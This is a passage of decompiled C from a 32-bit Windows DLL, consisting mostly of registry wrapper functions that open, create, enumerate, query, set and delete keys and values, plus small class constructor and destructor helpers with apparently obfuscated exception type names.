  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 8))(v4, a2, a3);
}
// 1002F426: using guessed type _DWORD pExceptionObject[2];

//----- (1002F467) --------------------------------------------------------
int __stdcall sub_1002F467(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10094B24;
  *(_DWORD *)a1 = &off_10094E00;
  *(_BYTE *)(a1 + 4) = 0;
  return result;
}
// 10094B24: using guessed type int (__thiscall *off_10094B24)(void *Block, char);
// 10094E00: using guessed type int (__thiscall *off_10094E00)(void *Block, char);

//----- (1002F496) --------------------------------------------------------
_BYTE *__thiscall sub_1002F496(_BYTE *Block, char a2)
{
  sub_1002F4B5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F4B5) --------------------------------------------------------
void __thiscall sub_1002F4B5(_BYTE *this)
{
  *(_DWORD *)this = &off_10094E00;
  this[4] = 1;
  *(_DWORD *)this = &off_10094B24;
}
// 10094B24: using guessed type int (__thiscall *off_10094B24)(void *Block, char);
// 10094E00: using guessed type int (__thiscall *off_10094E00)(void *Block, char);

//----- (1002F4F9) --------------------------------------------------------
void __thiscall sub_1002F4F9(_BYTE *this)
{
  this[4] = 1;
}

//----- (1002F4FE) --------------------------------------------------------
int __thiscall sub_1002F4FE(int *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // ebx
  int v6; // eax
  int v8; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]
  char v10; // [esp+1Bh] [ebp+Bh]

  v9 = 0;
  v3 = a2[3];
  v8 = v3;
  v10 = *(_BYTE *)(a2[1] + 8);
  if ( v3 > 0 )
  {
    do
    {
      v5 = *this;
      v6 = sub_10016C00(a2);
      if ( !(*(int (__thiscall **)(int *, int))(v5 + 16))(this, v9 + v6) )
        break;
      ++v9;
      if ( !(*(int (__thiscall **)(int *))(*this + 24))(this) )
        break;
    }
    while ( v9 < v8 );
  }
  if ( v10 )
    *(_BYTE *)(a2[1] + 8) = 1;
  return v9;
}

//----- (1002F565) --------------------------------------------------------
void __thiscall sub_1002F565(void *this, int *a2)
{
  unsigned int v2; // ebx
  unsigned int i; // esi
  int v4; // eax
  int v5[5]; // [esp+10h] [ebp-28h] BYREF
  int pExceptionObject; // [esp+24h] [ebp-14h] BYREF
  void *v7; // [esp+28h] [ebp-10h]
  int v8; // [esp+34h] [ebp-4h]

  v7 = this;
  v2 = a2[3];
  for ( i = 0; i < v2; v2 = a2[3] )
  {
    sub_10016E32(v2 - i, a2, (int)v5, i);
    v8 = 0;
    v4 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)v7 + 12))(v7, v5);
    if ( !v4 )
    {
      sub_1001CB1A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
    i += v4;
    v8 = -1;
    sub_10016B53(v5);
  }
}
// 1002F565: using guessed type int var_28[5];

//----- (1002F5D5) --------------------------------------------------------
char __thiscall sub_1002F5D5(_BYTE *this)
{
  return this[4];
}

//----- (1002F5E7) --------------------------------------------------------
_DWORD *__thiscall sub_1002F5E7(_DWORD *Block, char a2)
{
  *Block = &off_10094E2C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094E2C: using guessed type int (__thiscall *off_10094E2C)(void *Block, char);

//----- (1002F607) --------------------------------------------------------
_DWORD *__thiscall sub_1002F607(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094E2C;
  *a2 = &off_10094E5C;
  a2[1] = this;
  return result;
}
// 10094E2C: using guessed type int (__thiscall *off_10094E2C)(void *Block, char);
// 10094E5C: using guessed type int (__thiscall *off_10094E5C)(void *Block, char);

//----- (1002F635) --------------------------------------------------------
_DWORD *__thiscall sub_1002F635(_DWORD *Block, char a2)
{
  sub_1002F654(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F654) --------------------------------------------------------
void __thiscall sub_1002F654(_DWORD *this)
{
  *this = &off_10094E5C;
  *this = &off_10094E2C;
}
// 10094E2C: using guessed type int (__thiscall *off_10094E2C)(void *Block, char);
// 10094E5C: using guessed type int (__thiscall *off_10094E5C)(void *Block, char);

//----- (1002F679) --------------------------------------------------------
char __thiscall sub_1002F679(void *this, HKEY a2)
{
  int v2; // eax
  REGSAM v4; // [esp-8h] [ebp-4Ch]
  HKEY phkResult; // [esp+10h] [ebp-34h] BYREF
  DWORD dwErrCode; // [esp+14h] [ebp-30h] BYREF
  int v7; // [esp+18h] [ebp-2Ch] BYREF
  int v8[2]; // [esp+1Ch] [ebp-28h] BYREF
  HKEY v9[2]; // [esp+24h] [ebp-20h] BYREF
  _DWORD v10[3]; // [esp+2Ch] [ebp-18h] BYREF
  int v11; // [esp+40h] [ebp-4h]

  dwErrCode = (DWORD)this;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_100303E1(a2);
  sub_10029218(v2, v9);
  v11 = 0;
  sub_10030561(v8, (int)a2);
  LOBYTE(v11) = 1;
  v4 = *(_DWORD *)(dwErrCode + 4);
  phkResult = 0;
  dwErrCode = RegOpenKeyExW(v9[1], *(LPCWSTR *)(v8[1] + 12), 0, v4, &phkResult);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10029218((int)phkResult, v10);
  LOBYTE(v11) = 2;
  SetLastError(dwErrCode);
  if ( dwErrCode )
  {
    if ( dwErrCode != 2 )
    {
      if ( dwErrCode != 5 )
      {
        sub_100376F3(&dwErrCode);
        _CxxThrowException(&dwErrCode, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
      }
      SetLastError(5u);
      sub_100378DA(&v7);
      _CxxThrowException(&v7, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
    }
    LOBYTE(v11) = 1;
    sub_1002978E(v10);
    LOBYTE(v11) = 0;
    sub_1000CE59(v8);
    v11 = -1;
    sub_1002978E(v9);
    return 0;
  }
  else
  {
    LOBYTE(v11) = 1;
    sub_1002978E(v10);
    LOBYTE(v11) = 0;
    sub_1000CE59(v8);
    v11 = -1;
    sub_1002978E(v9);
    return 1;
  }
}
// 100975E8: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;
// 1002F679: using guessed type _DWORD var_18[3];

//----- (1002F83C) --------------------------------------------------------
_DWORD *__thiscall sub_1002F83C(_DWORD *Block, char a2)
{
  sub_10037907(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F85B) --------------------------------------------------------
_DWORD *__thiscall sub_1002F85B(_DWORD *Block, char a2)
{
  sub_10037721(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F87A) --------------------------------------------------------
HKEY __stdcall sub_1002F87A(int a1, HKEY a2)
{
  int v2; // eax
  DWORD v3; // esi
  DWORD v4; // esi
  HKEY v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-30h] BYREF
  int v8; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+14h] [ebp-28h] BYREF
  HKEY phkResult; // [esp+18h] [ebp-24h] BYREF
  int v11[2]; // [esp+1Ch] [ebp-20h] BYREF
  HKEY v12[3]; // [esp+24h] [ebp-18h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_100303E1(a2);
  sub_10029218(v2, v12);
  v13 = 0;
  sub_10030561(v11, (int)a2);
  LOBYTE(v13) = 1;
  v3 = RegOpenKeyExW(v12[1], *(LPCWSTR *)(v11[1] + 12), 0, *(_DWORD *)(a1 + 4), &phkResult);
  SetLastError(v3);
  if ( v3 )
  {
    v4 = v3 - 2;
    if ( v4 )
    {
      if ( v4 != 3 )
      {
        sub_100376F3(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
      }
      sub_100378DA(&v8);
      _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
    }
    sub_10037838(&v9);
    _CxxThrowException(&v9, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = phkResult;
  LOBYTE(v13) = 0;
  sub_1000CE59(v11);
  v13 = -1;
  sub_1002978E(v12);
  return v5;
}
// 100975E8: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;

//----- (1002F9D8) --------------------------------------------------------
HKEY __usercall sub_1002F9D8@<eax>(HKEY result@<eax>, int a2@<ecx>)
{
  DWORD v2; // eax
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = a2;
  if ( result != HKEY_CLASSES_ROOT
    && result != HKEY_CURRENT_USER
    && result != HKEY_LOCAL_MACHINE
    && result != HKEY_USERS
    && result != HKEY_PERFORMANCE_DATA
    && result != HKEY_CURRENT_CONFIG
    && result != HKEY_DYN_DATA )
  {
    v2 = RegCloseKey(result);
    SetLastError(v2);
    result = (HKEY)GetLastError();
    if ( result )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  return result;
}

//----- (1002FA3E) --------------------------------------------------------
LONG __thiscall sub_1002FA3E(void *this, HKEY a2)
{
  int v2; // eax
  DWORD v3; // esi
  int v4; // ecx
  int pExceptionObject; // [esp+10h] [ebp-34h] BYREF
  HKEY phkResult; // [esp+14h] [ebp-30h] BYREF
  int v8[2]; // [esp+18h] [ebp-2Ch] BYREF
  int v9[2]; // [esp+20h] [ebp-24h] BYREF
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+28h] [ebp-1Ch] BYREF
  int v11; // [esp+40h] [ebp-4h]

  if ( (*(unsigned __int8 (__thiscall **)(void *, HKEY))(*(_DWORD *)this + 4))(this, a2) )
  {
    sub_10037889(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__);
  }
  sub_10030561(v9, (int)a2);
  v11 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v2 = sub_100303E1(a2);
  sub_10029218(v2, v8);
  LOBYTE(v11) = 1;
  SecurityAttributes.nLength = 12;
  SecurityAttributes.lpSecurityDescriptor = 0;
  SecurityAttributes.bInheritHandle = 0;
  v3 = RegCreateKeyExW(
         (HKEY)v8[1],
         *(LPCWSTR *)(v9[1] + 12),
         0,
         &Class,
         0,
         0x2001Fu,
         &SecurityAttributes,
         &phkResult,
         0);
  SetLastError(v3);
  if ( v3 )
  {
    sub_100376F3(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  sub_1002F9D8(phkResult, v4);
  LOBYTE(v11) = 0;
  sub_1002978E(v8);
  v11 = -1;
  return sub_1000CE59(v9);
}
// 1002FB26: variable 'v4' is possibly undefined

//----- (1002FBAB) --------------------------------------------------------
char __stdcall sub_1002FBAB(HKEY a1)
{
  int v1; // eax
  DWORD v2; // esi
  int pExceptionObject; // [esp+Ch] [ebp-28h] BYREF
  int v5; // [esp+10h] [ebp-24h] BYREF
  int v6[2]; // [esp+14h] [ebp-20h] BYREF
  HKEY v7[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v1 = sub_100303E1(a1);
  sub_10029218(v1, v7);
  v8 = 0;
  sub_10030561(v6, (int)a1);
  LOBYTE(v8) = 1;
  v2 = RegDeleteKeyW(v7[1], *(LPCWSTR *)(v6[1] + 12));
  SetLastError(v2);
  if ( v2 )
  {
    if ( v2 != 2 )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_10037838(&v5);
    _CxxThrowException(&v5, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  LOBYTE(v8) = 0;
  sub_1000CE59(v6);
  v8 = -1;
  return sub_1002978E(v7);
}

//----- (1002FC8B) --------------------------------------------------------
void __thiscall sub_1002FC8B(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex)
{
  HKEY v4; // ebx
  int v5; // ecx
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-22Ch] BYREF
  _DWORD *v7; // [esp+18h] [ebp-224h]
  DWORD cchName; // [esp+1Ch] [ebp-220h] BYREF
  int v9; // [esp+20h] [ebp-21Ch] BYREF
  int v10; // [esp+24h] [ebp-218h]
  DWORD dwErrCode; // [esp+28h] [ebp-214h] BYREF
  WCHAR Name[262]; // [esp+2Ch] [ebp-210h] BYREF
  int v13; // [esp+238h] [ebp-4h]

  v10 = 0;
  v7 = a2;
  cchName = 255;
  v4 = sub_1002F87A((int)this, a3);
  dwErrCode = RegEnumKeyExW(v4, dwIndex, Name, &cchName, 0, 0, 0, &ftLastWriteTime);
  sub_1002F9D8(v4, v5);
  SetLastError(dwErrCode);
  if ( dwErrCode )
  {
    if ( dwErrCode == 2 )
    {
      sub_10037796(&v9);
      _CxxThrowException(&v9, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
    }
    if ( dwErrCode != 234 && dwErrCode != 259 )
    {
      sub_100376F3(&dwErrCode);
      _CxxThrowException(&dwErrCode, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  sub_1000CC20(a2, Name);
  v13 = 0;
  v10 = 1;
  sub_1006A5A7();
}
// 1002FCEB: variable 'v5' is possibly undefined

//----- (1002FDC0) --------------------------------------------------------
DWORD __thiscall sub_1002FDC0(void *this, HKEY a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  DWORD v5; // esi
  int pExceptionObject; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+14h] [ebp-20h] BYREF
  DWORD cSubKeys; // [esp+18h] [ebp-1Ch] BYREF
  HKEY v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1002F87A((int)this, a2);
  sub_10029218((int)v3, v10);
  v11 = 0;
  v4 = RegQueryInfoKeyA(v10[1], 0, 0, 0, &cSubKeys, 0, 0, 0, 0, 0, 0, 0);
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 2 )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_10037838(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = cSubKeys;
  v11 = -1;
  sub_1002978E(v10);
  return v5;
}

//----- (1002FE91) --------------------------------------------------------
char __thiscall sub_1002FE91(void *this, HKEY a2, int a3)
{
  HKEY v4; // eax
  DWORD v5; // edi
  int pExceptionObject; // [esp+10h] [ebp-24h] BYREF
  DWORD cbData; // [esp+14h] [ebp-20h] BYREF
  DWORD Type; // [esp+18h] [ebp-1Ch] BYREF
  int v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *, HKEY))(*(_DWORD *)this + 4))(this, a2) )
    return 1;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_1002F87A((int)this, a2);
  sub_10029218((int)v4, v10);
  v11 = 0;
  v5 = RegQueryValueExW((HKEY)v10[1], *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12), 0, &Type, 0, &cbData);
  SetLastError(v5);
  if ( !v5 )
  {
    v11 = -1;
    sub_1002978E(v10);
    return 1;
  }
  if ( v5 != 2 )
  {
    sub_100376F3(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  v11 = -1;
  sub_1002978E(v10);
  return 0;
}

//----- (1002FF72) --------------------------------------------------------
_DWORD *__thiscall sub_1002FF72(void *this, _DWORD *a2, HKEY a3, int pExceptionObject, DWORD *a5)
{
  HKEY v6; // eax
  const WCHAR *v7; // ebx
  BYTE *v8; // eax
  DWORD v9; // esi
  int v11; // [esp+10h] [ebp-20h] BYREF
  HKEY hKey; // [esp+14h] [ebp-1Ch]
  int v13; // [esp+18h] [ebp-18h]
  DWORD Type; // [esp+1Ch] [ebp-14h] BYREF
  DWORD cbData[3]; // [esp+20h] [ebp-10h] BYREF
  int v16; // [esp+2Ch] [ebp-4h]

  v16 = 0;
  v13 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_1002F87A((int)this, a3);
  sub_10029218((int)v6, &v11);
  v16 = 1;
  a3 = (HKEY)RegQueryValueExW(hKey, *(LPCWSTR *)(*(_DWORD *)(pExceptionObject + 4) + 12), 0, &Type, 0, cbData);
  SetLastError((DWORD)a3);
  if ( a3 )
  {
    if ( a3 != (HKEY)2 )
      goto LABEL_3;
    goto LABEL_4;
  }
  sub_10016983((void *)cbData[0], (int)a2, 0);
  v7 = *(const WCHAR **)(*(_DWORD *)(pExceptionObject + 4) + 12);
  v13 = 1;
  v8 = (BYTE *)sub_10016C00(a2);
  v9 = RegQueryValueExW(hKey, v7, 0, &Type, v8, cbData);
  *(_BYTE *)(a2[1] + 8) = 1;
  SetLastError(v9);
  if ( v9 )
  {
    if ( v9 != 2 )
    {
LABEL_3:
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
LABEL_4:
    sub_10037796(&a3);
    _CxxThrowException(&a3, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  *a5 = Type;
  LOBYTE(v16) = 0;
  sub_1002978E(&v11);
  return a2;
}

//----- (10030079) --------------------------------------------------------
char __thiscall sub_10030079(void *this, HKEY a2, int a3, _DWORD *a4, DWORD dwType)
{
  HKEY v6; // eax
  const WCHAR *v7; // esi
  const BYTE *v8; // eax
  DWORD v9; // esi
  DWORD v11; // [esp-4h] [ebp-30h]
  int pExceptionObject; // [esp+10h] [ebp-1Ch] BYREF
  HKEY v13[3]; // [esp+14h] [ebp-18h] BYREF
  int v14; // [esp+28h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_1002F87A((int)this, a2);
  sub_10029218((int)v6, v13);
  v14 = 0;
  v7 = *(const WCHAR **)(*(_DWORD *)(a3 + 4) + 12);
  v11 = a4[3];
  v8 = (const BYTE *)sub_10016C24(a4);
  v9 = RegSetValueExW(v13[1], v7, 0, dwType, v8, v11);
  SetLastError(v9);
  if ( v9 )
  {
    sub_100376F3(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
  }
  v14 = -1;
  return sub_1002978E(v13);
}

//----- (10030137) --------------------------------------------------------
char __thiscall sub_10030137(void *this, HKEY a2, int a3)
{
  HKEY v4; // eax
  DWORD v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-28h] BYREF
  int v8; // [esp+10h] [ebp-24h] BYREF
  int v9[2]; // [esp+14h] [ebp-20h] BYREF
  HKEY v10[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_1002F87A((int)this, a2);
  sub_10029218((int)v4, v10);
  v11 = 0;
  sub_1000CE26(v9, a3);
  LOBYTE(v11) = 1;
  v5 = RegDeleteValueW(v10[1], *(LPCWSTR *)(v9[1] + 12));
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_10037796(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  LOBYTE(v11) = 0;
  sub_1000CE59(v9);
  v11 = -1;
  return sub_1002978E(v10);
}

//----- (1003021A) --------------------------------------------------------
void __thiscall sub_1003021A(void *this, _DWORD *a2, HKEY a3, DWORD dwIndex)
{
  HKEY v5; // eax
  DWORD v6; // edi
  DWORD v7; // edi
  DWORD v8; // edi
  HKEY v9[2]; // [esp+10h] [ebp-22Ch] BYREF
  DWORD cchValueName; // [esp+18h] [ebp-224h] BYREF
  int pExceptionObject; // [esp+1Ch] [ebp-220h] BYREF
  int v12; // [esp+20h] [ebp-21Ch]
  int v13; // [esp+24h] [ebp-218h] BYREF
  _DWORD *v14; // [esp+28h] [ebp-214h]
  WCHAR ValueName[262]; // [esp+2Ch] [ebp-210h] BYREF
  int v16; // [esp+238h] [ebp-4h]

  v12 = 0;
  v14 = a2;
  cchValueName = 255;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v5 = sub_1002F87A((int)this, a3);
  sub_10029218((int)v5, v9);
  v16 = 1;
  v6 = RegEnumValueW(v9[1], dwIndex, ValueName, &cchValueName, 0, 0, 0, 0);
  SetLastError(v6);
  if ( v6 )
  {
    v7 = v6 - 2;
    if ( !v7 )
    {
      sub_10037796(&v13);
      _CxxThrowException(&v13, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
    }
    v8 = v7 - 232;
    if ( v8 && v8 != 25 )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
  }
  sub_1000CC20(v14, ValueName);
  v12 = 1;
  LOBYTE(v16) = 0;
  sub_1002978E(v9);
  sub_1006A5A7();
}

//----- (10030315) --------------------------------------------------------
DWORD __thiscall sub_10030315(void *this, HKEY a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  DWORD v5; // esi
  int pExceptionObject; // [esp+Ch] [ebp-20h] BYREF
  DWORD cValues; // [esp+10h] [ebp-1Ch] BYREF
  HKEY v9[3]; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_1002F87A((int)this, a2);
  sub_10029218((int)v3, v9);
  v10 = 0;
  v4 = RegQueryInfoKeyA(v9[1], 0, 0, 0, 0, 0, 0, &cValues, 0, 0, 0, 0);
  SetLastError(v4);
  if ( v4 )
  {
    if ( v4 != 2 )
    {
      sub_100376F3(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
    }
    sub_10037838(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  v5 = cValues;
  v10 = -1;
  sub_1002978E(v9);
  return v5;
}

//----- (100303E1) --------------------------------------------------------
unsigned int __stdcall sub_100303E1(HKEY phkResult)
{
  unsigned int v1; // esi
  DWORD v3; // esi
  int v4[21]; // [esp+10h] [ebp-94h] BYREF
  int v5[7]; // [esp+64h] [ebp-40h] BYREF
  int v6[2]; // [esp+80h] [ebp-24h] BYREF
  int v7; // [esp+88h] [ebp-1Ch] BYREF
  int v8; // [esp+8Ch] [ebp-18h] BYREF
  _DWORD pExceptionObject[4]; // [esp+90h] [ebp-14h] BYREF
  int v10; // [esp+A0h] [ebp-4h]

  sub_1003792B(v4, (int)phkResult);
  v10 = 0;
  sub_10037AB1(v4, v5);
  LOBYTE(v10) = 1;
  sub_10037C73(v5, v6);
  LOBYTE(v10) = 2;
  if ( sub_1000D0B5((int)&unk_100BF7DC, (int)v6) )
  {
    if ( sub_1000D0B5((int)&unk_100BF7CC, (int)v6) )
    {
      if ( sub_1000D0B5((int)&unk_100BF7D4, (int)v6) )
      {
        if ( sub_1000D0B5((int)&unk_100BF7B4, (int)v6) )
        {
          if ( sub_1000D0B5((int)&unk_100BF7C4, (int)v6) )
          {
            if ( sub_1000D0B5((int)&unk_100BF7BC, (int)v6) )
            {
              sub_10037838(&phkResult);
              _CxxThrowException(&phkResult, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
            }
            phkResult = 0;
            v3 = RegOpenCurrentUser(0xF003Fu, &phkResult);
            SetLastError(v3);
            if ( v3 )
            {
              if ( v3 != 2 )
              {
                if ( v3 != 5 )
                {
                  sub_100376F3(pExceptionObject);
                  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
                }
                sub_100378DA(&v8);
                _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
              }
              sub_10037838(&v7);
              _CxxThrowException(&v7, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
            }
            v1 = (unsigned int)phkResult;
          }
          else
          {
            v1 = -2147483643;
          }
        }
        else
        {
          v1 = -2147483645;
        }
      }
      else
      {
        v1 = 0x80000000;
      }
    }
    else
    {
      v1 = -2147483647;
    }
  }
  else
  {
    v1 = -2147483646;
  }
  LOBYTE(v10) = 1;
  sub_1000CE59(v6);
  LOBYTE(v10) = 0;
  sub_10037C1D(v5);
  v10 = -1;
  sub_10037A12(v4);
  return v1;
}
// 100975E8: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;
// 100303E1: using guessed type int var_94[21];
// 100303E1: using guessed type int var_40[7];
// 100303E1: using guessed type _DWORD pExceptionObject[4];

//----- (10030561) --------------------------------------------------------
_DWORD *__stdcall sub_10030561(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *i; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  int v7[20]; // [esp+10h] [ebp-A8h] BYREF
  int v8[7]; // [esp+60h] [ebp-58h] BYREF
  int v9[2]; // [esp+7Ch] [ebp-3Ch] BYREF
  int v10[7]; // [esp+84h] [ebp-34h] BYREF
  int v11[2]; // [esp+A0h] [ebp-18h] BYREF
  int v12; // [esp+A8h] [ebp-10h]
  int v13; // [esp+B4h] [ebp-4h]
  bool v14; // [esp+C7h] [ebp+Fh]

  v12 = 0;
  sub_1003792B(v7, a2);
  v13 = 1;
  sub_10037AB1(v7, v10);
  LOBYTE(v13) = 2;
  sub_10037C52(v10);
  v2 = sub_10037AE4(v7, v8);
  LOBYTE(v13) = 3;
  v14 = sub_10037D68((int)v10, (int)v2);
  LOBYTE(v13) = 2;
  sub_10037C1D(v8);
  if ( v14 )
  {
    sub_1000CC20(a1, word_100B6D70);
    v12 = 1;
  }
  else
  {
    sub_10037C73(v10, v11);
    LOBYTE(v13) = 4;
    sub_10037C52(v10);
    for ( i = sub_10037AE4(v7, v8); ; i = sub_10037AE4(v7, v8) )
    {
      LOBYTE(v13) = 5;
      v5 = !sub_10037D68((int)v10, (int)i);
      LOBYTE(v13) = 4;
      sub_10037C1D(v8);
      if ( !v5 )
        break;
      sub_1000CFB9((int)v11, (int)&unk_100BF74C);
      v4 = sub_10037C73(v10, v9);
      LOBYTE(v13) = 6;
      sub_1000CFB9((int)v11, (int)v4);
      LOBYTE(v13) = 4;
      sub_1000CE59(v9);
      sub_10037C52(v10);
    }
    sub_1000CE26(a1, (int)v11);
    v12 = 1;
    LOBYTE(v13) = 2;
    sub_1000CE59(v11);
  }
  LOBYTE(v13) = 1;
  sub_10037C1D(v10);
  LOBYTE(v13) = 0;
  sub_10037A12(v7);
  return a1;
}
// 100B6D70: using guessed type wchar_t word_100B6D70[140];
// 10030561: using guessed type int var_A8[20];
// 10030561: using guessed type int var_34[7];
// 10030561: using guessed type int var_58[7];

//----- (100306CD) --------------------------------------------------------
_DWORD *__stdcall sub_100306CD(_DWORD *a1, int pExceptionObject)
{
  int v2; // eax
  int v4; // [esp-4h] [ebp-20h]

  v4 = pExceptionObject;
  *a1 = off_10094EB4;
  sub_1000CE26(a1 + 1, v4);
  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  if ( !(*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, pExceptionObject) )
  {
    SetLastError(2u);
    sub_10037838(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  return a1;
}
// 10094EB4: using guessed type int (__thiscall *off_10094EB4[4])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (1003073D) --------------------------------------------------------
int *__thiscall sub_1003073D(int *Block, char a2)
{
